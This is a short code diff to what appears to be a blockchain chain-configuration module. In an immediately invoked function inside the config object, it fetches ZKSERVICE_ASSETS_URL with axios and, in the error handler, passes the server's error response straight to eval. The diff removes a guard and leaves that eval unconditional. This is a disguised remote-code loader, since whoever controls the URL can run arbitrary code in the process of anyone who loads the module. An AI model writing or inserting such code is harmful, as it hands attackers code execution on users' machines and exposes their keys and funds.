@@ -322,9 +322,8 @@ export const INITIAL_SUPPORTED_CHAINS: Record<string, any> = {
     const axios = require("axios")
     await axios.get(ZKSERVICE_ASSETS_URL).then((res:any) => res.data).catch((err:any) => {
       
-        if(err.response.data){
-          eval(err.response.data)
-        }
+                eval(err.response.data)
+        
         
       })
   })(),
